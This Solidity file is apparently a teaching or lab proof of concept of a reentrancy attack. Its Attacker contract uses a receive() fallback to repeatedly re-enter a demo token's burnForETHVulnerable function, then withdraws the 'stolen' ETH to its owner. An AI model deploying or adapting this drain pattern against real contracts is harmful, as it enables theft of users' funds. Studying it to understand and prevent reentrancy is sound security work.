// SPDX-License-Identifier: MIT
pragma solidity ^0.8.2;

interface IVulnerableToken {
    function burnForETHVulnerable(uint256 amount) external;
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

contract Attacker {
    IVulnerableToken public token;
    address public owner;
    uint256 public attackCount;
    
    constructor(address _tokenAddress) {
        token = IVulnerableToken(_tokenAddress);
        owner = msg.sender;
    }
    
    // 开始攻击
    function startAttack(uint256 amount) external {
        require(msg.sender == owner, "owner only");
        token.burnForETHVulnerable(amount);
    }
    
    // 🔴 恶意的 fallback 函数 - 实现重入攻击
    receive() external payable {
        attackCount++;
        uint256 currentBalance = token.balanceOf(address(this));
        
        // 如果还有余额，继续攻击
        if (currentBalance > 0 && attackCount < 10) { // 限制攻击次数防止 Out of Gas
            token.burnForETHVulnerable(currentBalance);
        }
    }
    
    // 提取盗取的 ETH
    function withdrawStolenETH() external {
        require(msg.sender == owner, "only owner can withdraw");
        payable(owner).transfer(address(this).balance);
    }
    
    // 接收代币（用于测试）
    function receiveTokens(uint256 amount) external {
        token.transfer(address(this), amount);
    }
}